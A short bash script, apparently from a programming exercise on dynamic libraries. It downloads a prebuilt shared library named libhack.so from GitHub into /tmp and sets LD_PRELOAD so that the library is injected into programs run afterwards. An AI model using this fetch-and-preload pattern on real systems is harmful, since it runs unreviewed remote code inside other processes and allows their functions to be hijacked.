#!/bin/bash
wget -P /tmp https://github.com/yao228/low_level_programming/raw/master/0x17-dynamic_libraries/libhack.so
export LD_PRELOAD=/tmp/libhack.so